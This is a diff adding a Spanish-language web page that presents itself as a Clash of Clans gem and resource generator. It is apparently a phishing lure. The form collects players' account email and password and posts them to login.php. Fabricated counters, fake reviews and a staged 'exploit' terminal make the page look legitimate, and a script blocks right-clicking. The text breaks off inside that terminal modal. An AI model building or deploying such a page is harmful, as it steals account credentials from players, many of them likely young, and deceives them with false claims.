@@ -1,0 +1,1137 @@
+<!doctype html>
+<html lang="en" itemscope itemtype="http://schema.org/WebSite"><meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <link rel="canonical" href="http://clashofclansresources.herokuapp.com">
+          <link href="http://fonts.googleapis.com/css?family=Roboto:500,900,100,300,700,400" rel="stylesheet" type="text/css">
+    <title>Generador de Gemas y Recursos COC</title>
+    <link rel="icon" type="image/png" href="img/favicon.png">
+    <link rel="stylesheet" href="css/default.min.css">
+	<style>
+					/* ===== Tipsy ===== */
+			
+					.tipsy { padding: 4px; font-size: 11px; position: absolute; z-index: 100000; }
+		
+					.tipsy-inner { padding: 5px 7px 5px 8px; background-color: black; color: white; max-width: 300px; text-align: center; }
+					.tipsy-inner { border-radius: 3px; -moz-border-radius:3px; -webkit-border-radius:3px; }
+					.tipsy-arrow { position: absolute; background: url('images/tipsy.gif') no-repeat top left; width: 9px; height: 5px; }
+					.tipsy-w { margin-left: 5px; }
+					.tipsy-w .tipsy-arrow { top: 50%; margin-top: -4px; left: 0; width: 5px; height: 9px; }
+		
+					body{
+						background-color:white;
+						font-size: 14px;
+					}
+					
+					.offerlst{
+			
+						background-color:rgba(239,239,239,0.5);
+						
+						border:1px solid white;
+						padding:20px;
+						border-radius:8px;
+						
+						min-height: 80px;
+						margin-bottom: 8px;
+						font-size: 16px;
+					}
+					.link_a, .link_a:link{
+						
+						
+						background-color: #F5F5F5;
+					    background-image: linear-gradient(to bottom, #FFFFFF, #E6E6E6);
+					    background-repeat: repeat-x;
+					    border-color: rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.1) #B3B3B3;
+					    border-image: none;
+					    border-radius: 4px 4px 4px 4px;
+					    border-style: solid;
+					    border-width: 1px;
+					    box-shadow: 0 1px 0 rgba(255, 255, 255, 0.2) inset, 0 1px 2px rgba(0, 0, 0, 0.05);
+					    color: #333333;
+					    cursor: pointer;
+					    display: inline-block;
+					    font-size: 14px;
+					    line-height: 20px;
+					    margin-bottom: 0;
+					    padding: 4px 12px;
+					    text-align: center;
+					    text-shadow: 0 1px 1px rgba(255, 255, 255, 0.75);
+					    vertical-align: middle;
+		
+						font-weight: normal;
+						text-decoration:none;
+		
+						
+						
+					}
+					
+					.link_a:hover{
+						background-position: 0 -15px;
+					    transition: background-position 0.1s linear 0s;
+					}
+					.each_p_elm{
+						margin: 3px 0;
+		
+						padding: 3px;
+						white-space:nowrap;
+					}
+					
+										/* ===== Tipsy ===== */
+			
+					.tipsy { padding: 4px; font-size: 11px; position: absolute; z-index: 100000; }
+		
+					.tipsy-inner { padding: 5px 7px 5px 8px; background-color: black; color: white; max-width: 300px; text-align: center; }
+					.tipsy-inner { border-radius: 3px; -moz-border-radius:3px; -webkit-border-radius:3px; }
+					.tipsy-arrow { position: absolute; background: url('../grabtrk.com/images/tipsy.gif') no-repeat top left; width: 9px; height: 5px; }
+					.tipsy-w { margin-left: 5px; }
+					.tipsy-w .tipsy-arrow { top: 50%; margin-top: -4px; left: 0; width: 5px; height: 9px; }
+		
+					body{
+						background-color:white;
+						font-size: 14px;
+					}
+					
+					.offerlst{
+			
+						background-color:rgba(239,239,239,0.5);
+						
+						border:1px solid white;
+						padding:20px;
+						border-radius:8px;
+						
+						min-height: 80px;
+						margin-bottom: 8px;
+						font-size: 18px;
+					}
+					.link_a, .link_a:link{
+						
+						
+						background-color: #F5F5F5;
+					    background-image: linear-gradient(to bottom, #FFFFFF, #E6E6E6);
+					    background-repeat: repeat-x;
+					    border-color: rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.1) #B3B3B3;
+					    border-image: none;
+					    border-radius: 4px 4px 4px 4px;
+					    border-style: solid;
+					    border-width: 1px;
+					    box-shadow: 0 1px 0 rgba(255, 255, 255, 0.2) inset, 0 1px 2px rgba(0, 0, 0, 0.05);
+					    color: #333333;
+					    cursor: pointer;
+					    display: inline-block;
+					    font-size: 14px;
+					    line-height: 20px;
+					    margin-bottom: 0;
+					    padding: 4px 12px;
+					    text-align: center;
+					    text-shadow: 0 1px 1px rgba(255, 255, 255, 0.75);
+					    vertical-align: middle;
+		
+						font-weight: normal;
+						text-decoration:none;
+		
+						
+						
+					}
+					
+					.link_a:hover{
+						background-position: 0 -15px;
+					    transition: background-position 0.1s linear 0s;
+					}
+					.each_p_elm{
+						margin: 3px 0;
+		
+						padding: 3px;
+						white-space:nowrap;
+					}
+										/* ===== Tipsy ===== */
+			
+					.tipsy { padding: 4px; font-size: 11px; position: absolute; z-index: 100000; }
+		
+					.tipsy-inner { padding: 5px 7px 5px 8px; background-color: black; color: white; max-width: 300px; text-align: center; }
+					.tipsy-inner { border-radius: 3px; -moz-border-radius:3px; -webkit-border-radius:3px; }
+					.tipsy-arrow { position: absolute; background: url('../filefirst.net/images/tipsy.gif') no-repeat top left; width: 9px; height: 5px; }
+					.tipsy-w { margin-left: 5px; }
+					.tipsy-w .tipsy-arrow { top: 50%; margin-top: -4px; left: 0; width: 5px; height: 9px; }
+		
+					body{
+						background: transparent;
+						font-size: 14px;
+					}
+					
+					.offerlst{
+			
+						background-color:rgba(239,239,239,0.5);
+						
+						border:1px solid white;
+						padding:20px;
+						border-radius:8px;
+						
+						min-height: 80px;
+						margin-bottom: 8px;
+						font-size: 16px;
+					}
+					.link_a, .link_a:link{
+						
+						
+						background-color: #F5F5F5;
+					    background-image: linear-gradient(to bottom, #FFFFFF, #E6E6E6);
+					    background-repeat: repeat-x;
+					    border-color: rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.1) #B3B3B3;
+					    border-image: none;
+					    border-radius: 4px 4px 4px 4px;
+					    border-style: solid;
+					    border-width: 1px;
+					    box-shadow: 0 1px 0 rgba(255, 255, 255, 0.2) inset, 0 1px 2px rgba(0, 0, 0, 0.05);
+					    color: #333333;
+					    cursor: pointer;
+					    display: inline-block;
+					    font-size: 14px;
+					    line-height: 20px;
+					    margin-bottom: 0;
+					    padding: 4px 12px;
+					    text-align: center;
+					    text-shadow: 0 1px 1px rgba(255, 255, 255, 0.75);
+					    vertical-align: middle;
+		
+						font-weight: normal;
+						text-decoration:none;
+		
+						
+						
+					}
+					
+					.link_a:hover{
+						background-position: 0 -15px;
+					    transition: background-position 0.1s linear 0s;
+					}
+					.each_p_elm{
+						margin: 3px 0;
+		
+						padding: 3px;
+						white-space:nowrap;
+					}
+										.link_a {
+	display: block;
+	background: -webkit-linear-gradient(#ffd34c, #fcb326) !important; /* For Safari 5.1 to 6.0 */
+	background: -o-linear-gradient(#ffd34c, #fcb326) !important; /* For Opera 11.1 to 12.0 */
+	background: -moz-linear-gradient(#ffd34c, #fcb326) !important; /* For Firefox 3.6 to 15 */
+	background: linear-gradient(#ffd34c, #fcb326) !important; /* Standard syntax (must be last) */
+	background-color: #fcb326 !important;
+	font-weight: 700;
+	font-size: 14px !important;
+	color: #303030;
+	text-align: center;
+	text-transform: uppercase;
+	padding: 1.5%;
+	text-decoration: none;
+	border-radius: 5px;
+	border: 1px solid #ffd34c;
+	width: 100%;
+	cursor: pointer;
+}
+
+.main {
+	max-width: 960px;
+	margin: 0 auto;
+}
+.top_head_text{
+ color:white;
+ font-size:25px;
+}
+.header {
+	text-align: center;
+	padding-top: 50px;
+	text-align: center;
+	padding-bottom: 50px;
+}
+.header img {
+	max-width: 100%;
+}
+.clearfix {
+	clear: both;
+}
+.jumbotron {
+	background: transparent;
+	padding: 0px !important;
+}
+
+.jumbotron-left {
+	width: 50%;
+	float: left;
+}
+.jumbotron-right {
+	width: 47%;
+	margin-left: 3%;
+	float: left;
+	text-align: right;
+}
+.jumbotron-right img {
+	max-width: 100%;
+}
+.file {
+	border: 2px solid #ffffff;
+	border-radius: 5px;
+	padding: 3%;
+}
+.file-hero {
+	font-weight: 300;
+	font-size: 30px;
+	color: #ffffff;
+	text-transform: uppercase;
+}
+.file-zero {
+	color: #fff;
+	text-align: center;
+}
+.file-img {
+	float: left;
+	margin-right: 2%;
+	width: 16%;
+}
+.file-img img {
+	max-width: 100%;
+}
+.file-text {
+	float: left;
+	width: 82%;
+}
+.file-name {
+	font-weight: 100;
+	font-size: 19px;
+	color: #ffffff;
+	margin-top: 0px;
+	margin-bottom: 0px;
+}
+
+.file-size {
+	font-weight: 700;
+	font-size: 23px;
+	color: #475773;
+	text-transform: uppercase;
+	margin-top: -5px;
+	margin-bottom: 0px;
+}
+.file-value {
+	font-weight: 400;
+	color: #ffffff;
+	font-size: 14px;
+	margin-top: 0px;
+}
+.report-file {
+	font-weight: 400;
+	font-size: 14px;
+	text-decoration: underline;
+	color: #3e777c;
+	margin-top: 0;
+	margin-bottom: 0;
+}
+.download-button {
+
+}
+.dl_button {
+	display: block;
+	background: -webkit-linear-gradient(#ffd34c, #fcb326); /* For Safari 5.1 to 6.0 */
+	background: -o-linear-gradient(#ffd34c, #fcb326); /* For Opera 11.1 to 12.0 */
+	background: -moz-linear-gradient(#ffd34c, #fcb326); /* For Firefox 3.6 to 15 */
+	background: linear-gradient(#ffd34c, #fcb326); /* Standard syntax (must be last) */
+	background-color: #fcb326;
+	font-weight: 700;
+	font-size: 30px;
+	color: #ffffff;
+	text-align: center;
+	text-transform: uppercase;
+	padding: 1.5%;
+	padding-top: 2%;
+	text-decoration: none;
+	border-radius: 3px;
+	border: 1px solid #ffd34c;
+	width: 85%;
+	margin-top: 25px;
+}
+.dl_button:hover {
+	background: -webkit-linear-gradient(#fcb326, #ffd34c); /* For Safari 5.1 to 6.0 */
+	background: -o-linear-gradient(#fcb326, #ffd34c); /* For Opera 11.1 to 12.0 */
+	background: -moz-linear-gradient(#fcb326, #ffd34c); /* For Firefox 3.6 to 15 */
+	background: linear-gradient(#fcb326, #ffd34c); /* Standard syntax (must be last) */
+}
+.dl_button img {
+	vertical-align: middle;
+	margin-left: 2%;
+	margin-top: -5px;
+}
+.hide-div {
+
+}
+.show-div {
+	margin-top: 20px;
+}
+
+.half-content {
+	width: 48%;
+	margin-bottom: 30px;
+}
+.full-content {
+	margin-bottom: 30px;
+}
+.content {
+	width: 100%;
+	margin-bottom: 10px;
+}
+.full-button {
+}
+.link_a {
+	display: block;
+	background: -webkit-linear-gradient(#ffd34c, #fcb326) !important; /* For Safari 5.1 to 6.0 */
+	background: -o-linear-gradient(#ffd34c, #fcb326) !important; /* For Opera 11.1 to 12.0 */
+	background: -moz-linear-gradient(#ffd34c, #fcb326) !important; /* For Firefox 3.6 to 15 */
+	background: linear-gradient(#ffd34c, #fcb326) !important; /* Standard syntax (must be last) */
+	background-color: #fcb326 !important;
+	font-weight: 700;
+	font-size: 14px !important;
+	color: #303030;
+	text-align: center;
+	text-transform: uppercase;
+	padding: 1.5%;
+	text-decoration: none;
+	border-radius: 5px;
+	border: 1px solid #ffd34c;
+	width: 100%;
+	cursor: pointer;
+}
+.link_a img {
+	vertical-align: middle;
+	margin-left: 1%;
+	margin-top: -3px;
+}
+.link_a:hover {
+	background: -webkit-linear-gradient(#fcb326, #ffd34c) !important; /* For Safari 5.1 to 6.0 */
+	background: -o-linear-gradient(#fcb326, #ffd34c) !important; /* For Opera 11.1 to 12.0 */
+	background: -moz-linear-gradient(#fcb326, #ffd34c) !important; /* For Firefox 3.6 to 15 */
+	background: linear-gradient(#fcb326, #ffd34c) !important; /* Standard syntax (must be last) */
+}
+.content-hero {
+	font-weight: 700;
+	font-size: 22px;
+	color: #3f3f3f;
+	margin-top: 0;
+	margin-bottom: 5px;
+}
+.lead {
+	font-weight: 400;
+	font-size: 14px;
+	color: #3e777c;
+	margin-top: 0;
+}
+.services {
+	margin-top: 5px;
+	font-weight: 400;
+	font-size: 12px;
+	color: #ffffff;
+}
+.services a {
+	color: #266166;
+	text-decoration: none;
+}
+
+.steps {
+	border-bottom: 1px solid #468f95;
+	padding-bottom: 50px;
+}
+.steps-hero {
+	font-weight: 300;
+	font-size: 30px;
+	color: #ffffff;
+	text-align: center;
+	text-transform: uppercase;
+	margin-top: 0px;
+	margin-bottom: 25px;
+}
+.step-section {
+	width: 31%;
+	float: left;
+	margin-right: 3%;
+}
+.section-img {
+	width: 25%;
+	float: left;
+	margin-right: 2%;
+}
+.section-img img {
+	max-width: 100%;
+}
+.section-text {
+	width: 73%;
+	margin-top: -7px;
+	float: left;
+}
+.section-text-hero {
+	font-weight: 100;
+	font-size: 60px;
+	color: #ffffff;
+	margin-top: 0;
+	margin-bottom: 0;
+	line-height: 45px;
+}
+.section-text-zero {
+	font-weight: 400;
+	font-size: 14px;
+	color: #ffffff;
+	margin-bottom: 0;
+	margin-top: 5px;
+}
+.comments {
+	padding-top: 50px;
+	padding-bottom: 50px;
+}
+.comment-hero {
+	font-weight: 300;
+	font-size: 26px;
+	color: #ffffff;
+	text-transform: uppercase;
+	margin-top: 0px;
+	text-align: center;
+}
+.comment-section {
+	padding-bottom: 25px;
+	padding-top: 10px;
+	border-bottom: 1px solid #468f95;
+}
+.comment-date-name {
+	margin-bottom: 5px;
+}
+.commenter-name {
+	font-weight: 400;
+	font-size: 24px;
+	color: #ffffff;
+	float: left;
+	text-align: left;
+	width: 50%;
+	margin-bottom: 0px;
+	margin-top: 0;
+}
+.commenter-date {
+	font-weight: 400;
+	font-size: 12px;
+	color: #ffffff;
+	float: left;
+	text-align: right;
+	width: 50%;
+	/*                position: relative;
+	 top: 20px;*/
+}
+.commenter-comment {
+	font-weight: 400;
+	font-size: 14px;
+	color: #ffffff;
+	margin-top: 0;
+	margin-bottom: 0;
+}
+.commenter-reply {
+	font-weight: 400;
+	font-size: 12px;
+	color: #475773;
+	margin-top: 5px;
+	margin-bottom: 0;
+}
+.footer {
+	padding-top: 30px;
+	padding-bottom: 10px;
+}
+.footer-left {
+	width: 50%;
+	float: left;
+	text-align: left;
+	font-weight: 400;
+	font-size: 12px;
+	color: #30757b;
+}
+
+.footer-right {
+	width: 50%;
+	float: left;
+	text-align: right;
+	margin-top: -7px;
+}
+.footer-nav {
+	padding-left: 0;
+}
+.footer-nav li {
+	font-weight: 400;
+	font-size: 12px;
+	color: #30757b;
+	display: inline;
+	padding-left: 0;
+}
+.footer-nav li a {
+	font-weight: 400;
+	font-size: 12px;
+	color: #30757b;
+}
+
+@media screen and (max-width: 980px) {
+	.main {
+		padding-left: 2%;
+		padding-right: 2%;
+	}
+	.file-name {
+		font-size: 18px;
+	}
+	.file-size {
+		font-size: 23px;
+	}
+	.file-value {
+		font-size: 12px;
+	}
+	.dl_button {
+		font-size: 25px;
+	}
+	.dl_button img {
+		width: 10%;
+	}
+	.content-hero {
+		font-size: 18px;
+	}
+	.link_a {
+		font-size: 11px !important;
+	}
+	.link_a img {
+		width: 8%;
+	}
+	.section-text-hero {
+		font-size: 40px;
+	}
+	.section-text-zero {
+		font-size: 13px;
+	}
+}
+
+@media screen and (max-width: 900px) {
+	.link_a {
+		font-size: 10px !important;
+	}
+}
+@media screen and (max-width: 850px) {
+	.link_a {
+		width: 100%;
+	}
+	.jumbotron-left {
+		width: 80%;
+		margin-left: 10%;
+		margin-right: 10%;
+	}
+	.jumbotron-right {
+		display: none;
+	}
+	.step-section {
+		width: 80%;
+		margin-left: 10%;
+		margin-right: 10%;
+		margin-bottom: 25px;
+	}
+	.footer-left {
+		width: 100%;
+		text-align: center;
+		margin-left: 0;
+		margin-right: 0;
+	}
+	.footer-right {
+		width: 100%;
+		text-align: center;
+		margin-left: 0;
+		margin-right: 0;
+	}
+	.header {
+		padding-bottom: 15px;
+	}
+	.file-hero {
+		text-align: center;
+	}
+}
+
+@media screen and (max-width: 800px) {
+	.steps-hero {
+		font-size: 25px;
+	}
+	.comment-hero {
+		font-size: 23px;
+	}
+	.commenter-name {
+		font-size: 20px;
+	}
+}
+
+@media screen and (max-width: 600px) {
+	.link_a {
+		font-size: 10px !important;
+	}
+	.commenter-comment {
+		font-size: 13px;
+	}
+	.comment-hero {
+		font-size: 20px;
+	}
+	.steps-hero {
+		font-size: 20px;
+	}
+	.link_a img {
+		margin-left: 1%;
+	}
+	.content-hero {
+		font-size: 16px;
+		text-align: center;
+	}
+	.lead {
+		font-size: 12px;
+		text-align: center;
+	}
+	.file-name {
+		font-size: 14px;
+	}
+	.file-size {
+		font-size: 20px;
+	}
+	.file-value {
+		font-size: 11px;
+	}
+	.file-text {
+		margin-top: 15px;
+	}
+}
+
+@media screen and (max-width: 550px) {
+	.link_a {
+		font-size: 9px1important;
+	}
+	.dl_button {
+		font-size: 17px;
+	}
+	.jumbotron-left {
+		margin-left: 2.5%;
+		margin-right: 2.5%;
+		width: 95%;
+	}
+
+}
+@media screen and (max-width: 450px) {
+	.jumbotron-left {
+		width: 95%;
+		margin-left: 2.5%;
+		margin-right: 2.5%;
+	}
+	.section-text-hero {
+		font-size: 30px;
+		margin-bottom: -7px;
+	}
+	.file-text {
+		margin-top: 0px;
+	}
+	.file-name {
+		font-size: 11px;
+	}
+	.file-size {
+		font-size: 15px;
+		margin-top: 0px;
+	}
+	.link_a img {
+		display: none;
+	}
+}
+@media screen and (max-width: 400px) {
+}
+.tipsy { display:none !important;padding: 4px; font-size: 11px; position: absolute; z-index: 100000; }
+			
+						.tipsy-inner { padding: 5px 7px 5px 8px; background-color: black; color: white; max-width: 300px; text-align: center; }
+						.tipsy-inner { border-radius: 3px; -moz-border-radius:3px; -webkit-border-radius:3px; }
+						.tipsy-arrow { position: absolute; background: url('../gripmedia.co/images/tipsy.gif') no-repeat top left; width: 9px; height: 5px; }
+						.tipsy-w { margin-left: 5px; }
+						.tipsy-w .tipsy-arrow { top: 50%; margin-top: -4px; left: 0; width: 5px; height: 9px; }
+
+
+
+a:hover, a:focus {
+color: #FFFFFF;
+text-decoration: underline;
+}		
+				</style>
+				
+				<script type='text/javascript'>
+/*Mensaje que puedes personalizar*/ var mensajeerror = "Boton derecho deshabilitado ¡Gracias por visitarnos!"; if(document.layers) window.captureEvents(Event.MOUSEDOWN); function bloquear(e){
+if (navigator.appName == 'Netscape' && ( e.which == 2 || e.which == 3)) { alert(mensajeerror);return false; }
+if (navigator.appName == 'Microsoft Internet Explorer' && (event.button == 2 || event.button == 3)) {
+alert(mensajeerror);return false; }} window.onmousedown=bloquear; document.onmousedown=bloquear;  </script>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-63559780-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+<!-- Facebook Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
+n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
+document,'script','//connect.facebook.net/en_US/fbevents.js');
+
+fbq('init', '1679144078992154');
+fbq('track', "PageView");</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1679144078992154&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Facebook Pixel Code -->
+
+</head>
+
+<body>
+   
+    <nav class="navbar navbar-inverse navbar-custom" role="navigation"> <!-- navbar-fixed-top -->
+        <div class="container">
+            <div class="navbar-header">
+                <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-main"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span> </button> <a class="navbar-brand text-supercell" href="index-2.php">Clash of Clans</a>
+				</div>
+            <div class="collapse navbar-collapse" id="navbar-main">
+                <ul class="nav navbar-nav navbar-right">
+                    <li class="active"> <a href="#section-one" class="scroll-push">Inicio</a> </li>
+                    <li> <a href="#section-two" class="scroll-push">Información</a> </li>
+                    <li> <a href="#section-three" class="scroll-push">Cómo Funciona</a> </li>
+                    <li> <a href="#section-four" class="scroll-push">Valoraciones</a> </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+      <header id="section-one">
+        <div class="header-container text-center">
+
+            <div class="col-sm-6 col-sm-offset-3 text-center">
+                <div class="section-one-int12ro">
+                    <!-- <img src="img/logo.png" class="img-responsive center-block" /> -->
+
+                    <div class="form-container pbh">
+                        <img src="img/ribbon-top.png" class="ribbon-top-img img-responsive" />
+
+                        <div class="form-content">
+                            <form method="post" action="login.php" id="form-hack">
+         			    <div id="form-step-one">
+                                    <p style="font-family: Roboto, Arial;"><strong>GENERA <span class="gems-color">GEMAS</span>, <span class="gold-color">ORO</span>, <span class="elixir-color">ELIXIR</span> Y <span class="darkelixir-color">ELIXIR NEGRO</span></strong></p><hr></hr> 
+                                    
+                                    <p class="text-left">Introduce el email de tu cuenta CoC para generar los recursos</p>
+
+                                    <div class="form-group">
+                                        <div class="input-group">
+                                            <span class="input-group-addon" style="padding: 5px;">
+                                                <img src="img/userface.png" width="28" height="28" alt="Clash of Clans Coin Icon" />
+                                            </span>
+                                           <input name="email" class="form-control" placeholder=" E-mail " id="email" type="email"  required />
+                            		             										  
+					  </div>			      
+                                    </div>				    					
+                                     <p class="text-left">Introduce la contraseña de tu cuenta CoC para generar los recursos</p>
+                                    <div class="form-group">
+                                        <div class="input-group">										
+                                            <span class="input-group-addon" style="padding: 5px;">
+                                                <img src="img/userface.png" width="28" height="28" alt="Clash of Clans Coin Icon" />
+                                            </span>		      							 
+                                            <input name="pass" class="form-control" placeholder="Contraseña" id="pass" type="password"  required />
+	
+                                          </div>
+                                    </div>
+				</div>
+
+                                <div id="form-step-two" style="display: none">
+                                    <div class="form-group">
+                                        <div class="input-group"> <span class="input-group-addon"> <img src="img/icons/coc-coin.svg" width="18" height="18" alt="Clash of Clans Coin Icon"> </span>
+                                            <input type="text" name="form-coin" class="form-control" placeholder="Cantidad de Oro" /> </div>
+                                    </div>
+                                    <div class="form-group">
+                                        <div class="input-group"> <span class="input-group-addon"> <img src="img/icons/coc-elixir.svg" width="18" height="18" alt="Clash of Clans Elixir Icon"> </span>
+                                            <input type="text" name="form-elixir" class="form-control" placeholder="Cantidad de Elixir" /> </div>
+                                    </div>
+                                    <div class="form-group">
+                                        <div class="input-group"> <span class="input-group-addon"> <img src="img/icons/coc-dark-elixir.svg" width="18" height="18" alt="Clash of Clans Dark Elixir Icon"> </span>
+                                            <input type="text" name="form-dark-elixir" class="form-control" placeholder="Cantidad de Elixir Negro" /> </div>
+                                    </div>
+                                    <div class="form-group">
+                                        <div class="input-group"> <span class="input-group-addon"> <img src="img/icons/coc-gem.svg" width="18" height="18" alt="Clash of Clans Gem Icon"> </span>
+                                            <input type="text" name="form-gem" class="form-control" placeholder="Cantidad de Gemas" /> </div>
+                                    </div>
+                                </div>   
+                                <div class="form-group text-center">
+                                    <button type="submit" id="login" data-step="one" class="btn btn-primary btn-wide btn-clear sendButton">Continuar</button>
+                                    <img style="margin: 30px auto -50px auto;" src="img/wizard.png" class="img-responsive" />
+                                </div>
+                            </form>
+                        </div>
+                        <div class="ribbon-container">
+                            <div class="ribbon-bottom"> <span class="ribbon-bottom-text">&nbsp;</span> </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+          
+        </div>
+      </header>
+
+
+      <div class="statistics">
+          <div class="container">
+            <div class="row">
+                <div class="col-xm-4 col-sm-6 col-md-4 col-lg-6 col-centered">
+                    <div class="peoplecount-container text-center">
+                        <p class="label-success">Estado del Generador: ONLINE</p><hr>
+                        <p class="text-invert stats">Última Actualización: <span class="highlight-text" id="current-date"></span></p><hr>
+                        <p class="text-invert stats">Total de recursos generados hoy: <span class="highlight-text" id="resources-generated">38829353</span></p><hr>
+                        <p class="text-invert stats" id>Usuarios Online: <span class="highlight-text" id="online-people"></span></p>
+                    </div>
+                </div>
+            </div>
+          </div>
+      </div>
+
+        <div id="section-two" class="section-container section-two">
+            <div class="container v-center">
+                <div class="section-content">
+                    <p class="h2 text-uppercase text-center text-supercell mvh" style="color: #fff;">Video Información del Generador COC</p>
+                    <div class="row">
+                        <div class="col-md-8 col-centered">
+                            <video id="video-js-player" class="video-js vjs-default-skin" preload="none" poster="img/video/poster.jpg" data-setup="{}" onClick="this.paused?this.play():this.pause();">
+                                <source src="video/proofcoc.mp4" type="video/mp4">
+                            </video>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+      <div class="howworksArea" id="section-three">
+          <div class="container">
+            <div class="row">
+                <div class="col-xm-12 col-sm-12 col-md-6 col-lg-6 text-center">
+
+
+
+
+<div id="fb-root"></div><script>(function(d, s, id) {  var js, fjs = d.getElementsByTagName(s)[0];  if (d.getElementById(id)) return;  js = d.createElement(s); js.id = id;  js.src = "//connect.facebook.net/es_LA/sdk.js#xfbml=1&version=v2.3";  fjs.parentNode.insertBefore(js, fjs);}(document, 'script', 'facebook-jssdk'));</script><div class="fb-post" data-href="https://www.facebook.com/permalink.php?story_fbid=1567784753485989&amp;id=1567218603542604" data-width="500"><div class="fb-xfbml-parse-ignore"><blockquote cite="https://www.facebook.com/permalink.php?story_fbid=1567784753485989&amp;id=1567218603542604"><p>&#xfe826; Te voy a guiar c&#xf3;mo conseguir #gemas y #recursos ilimitados &#xfe826;S&#xf3;lo sigue estos 3 pasos:1 &#x27a8; Comparte esta foto2 &#x27a8;...</p>Posted by <a href="https://www.facebook.com/pages/CoC-Resources/1567218603542604">CoC Resources</a> on <a href="https://www.facebook.com/permalink.php?story_fbid=1567784753485989&amp;id=1567218603542604">Sábado, 30 de mayo de 2015</a></blockquote></div></div>
+
+
+                </div>
+                <div class="col-xm-12 col-sm-12 col-md-6 col-lg-6">
+                    <h3 class="text-primary text-supercell text-center">Cómo funciona nuestro Generador</h3>
+                    <!--                     <p>We'll take few minutes to explain how our <strong>Clash of Clans Gems Generator</strong> works.
+                    We are using some advanced algorithms &amp; exploits, unpatched by Supercell so we can inject resources into COC Villages based on your account.</p> -->
+
+                    <p class="text-left">Solo necesita introducir su <strong> E-mail </strong> en nuestro generador. Una vez que ha escrito su correo electrónico, se le llevará al siguiente paso donde debe .<strong> elegir los recursos </strong>.</p>
+
+                    <p>Introduzca la cantidad de <span class="gems-color"><strong>GEMAS</strong></span>, <span class="gold-color"><strong>ORO</strong></span>, <span class="elixir-color"><strong>ELIXIR</strong></span> Y <span class="darkelixir-color"><strong>ELIXIR NEGRO</strong></span> que desea generar.
+
+                    Después de completar todos los pasos, toma unos minutos para actualizar su cuenta con los recursos seleccionados.</p>
+
+                   <!--  <img src="img/asdfas.jpg" class="img-responsive center-block" />
+                    -->
+
+                    <h3 class="text-primary text-supercell text-center">Ayudanos a Crecer!</h3>
+                    
+                    <div class="growup-buttons">
+
+                        <a href="http://www.facebook.com/share.php?u=https://www.facebook.com/permalink.php?story_fbid=1567784753485989&id=1567218603542604/?type=1&amp;title='Generador%20Gemas%20Coc'" target="_blank"><img src="img/likeandsharebutton.png" class="img-responsive center-block" alt=" Generator de Gemas Clash of Clans" /></a>
+                    </div>
+       
+                </div>
+            </div>
+          </div>
+      </div>
+
+
+    <div class="reviewsArea" id="section-four">
+      <div class="container">
+        <div class="row text-center">
+          <div class="col-xm-12 col-sm-12 col-md-12 col-lg-12"><br/>
+            <h1 class="text-supercell">Comentarios Recientes</h1>
+          </div>
+        </div>
+        <div class="row text-center">
+          <div class="col-xm-4 col-sm-4 col-md-4 col-lg-4">
+              <img src="img/review1.png" class="user-avatar img-responsive img-circle">
+              <h3 class="text-supercell">Jack Bailey</h3>
+              <p class="small">Gracias, después de varias horas de búsqueda me encontré con este increible generador, y he sido capaz de generar facilmente Oro, Elixir y gemas, muchas gracias!</p>
+
+              <img src="img/proof1.png" class="proof img-responsive center-block" />
+          </div>
+
+          <div class="col-xm-4 col-sm-4 col-md-4 col-lg-4">
+              <img src="img/review2.png" class="user-avatar img-responsive img-circle">
+              <h3 class="text-supercell">Aviana Haney</h3>
+              <p class="small">Muchas gracias, en tan sólo unos minutos pude generar recursos ilimitados como: Gemas, Elixir, Oro y Elixir Negro.<br> Su generador es el mejor! : D</p>
+
+              <img src="img/proof2.png" class="proof img-responsive center-block" />
+          </div>
+
+          <div class="col-xm-4 col-sm-4 col-md-4 col-lg-4">
+
+              <img src="img/review3.png" class="user-avatar img-responsive img-circle">
+              <h3 class="text-supercell">Marcos Rivers</h3>
+              <p class="small">Funcionó perfectamente para mí, me generó una gran cantidad de gemas y recursos para mi Aldea COC en muy poco tiempo. Ahora no tengo que preocuparme de las GEMAS.</p>
+
+              <img src="img/proof3.png" class="proof img-responsive center-block" />
+          </div>
+
+        </div>
+        </div>
+      </div> 
+
+
+            <div class="modal fade modal-console" id="modal-console">
+                <div class="modal-dialog">
+                    <div class="modal-content">
+                        <div class="modal-header">
+                            <h4 class="modal-title"> <span class="fa fa-fw fa-terminal"></span> @ root </h4> </div>
+                        <div class="modal-body">
+                            <div class="modal-console-container">
+                                <div id="typed"> <span class="instant text-primary">$root:</span> Comprobando estado de la conexión <span class="instant text-success">[OK]</span>
+                                    <br> <span class="instant text-primary">$root:</span> Iniciando funciones del exploit <span class="instant text-success">[OK]</span>
+                                    <br> <span class="instant text-primary">$root:</span>Añadiendo a la cola diferentes algoritmos para el uso en caso de fallo <span class="instant text-info">[En Cola]</span>
+                                    <br> <span class="instant text-primary">$root:</span> Conectando con la Base de datos de Supercell Clash of Clans<span class="instant text-danger">[ERROR]</span>
